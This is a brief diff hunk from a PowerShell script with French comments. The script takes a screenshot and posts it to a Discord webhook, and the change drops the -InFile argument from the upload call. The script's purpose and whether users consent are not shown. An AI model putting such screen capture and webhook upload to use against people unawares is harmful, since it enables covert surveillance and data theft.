@@ -31,7 +31,7 @@ if (-not $bitmap.GetPixel(0, 0).IsEmpty) {
     }
 
     # Envoyer la capture d'écran au webhook Discord avec l'embed
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body ($payload | ConvertTo-Json) -InFile $fileName -Verbose
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body ($payload | ConvertTo-Json) -Verbose
 } else {
     Write-Host "La capture d'écran a échoué."
 }
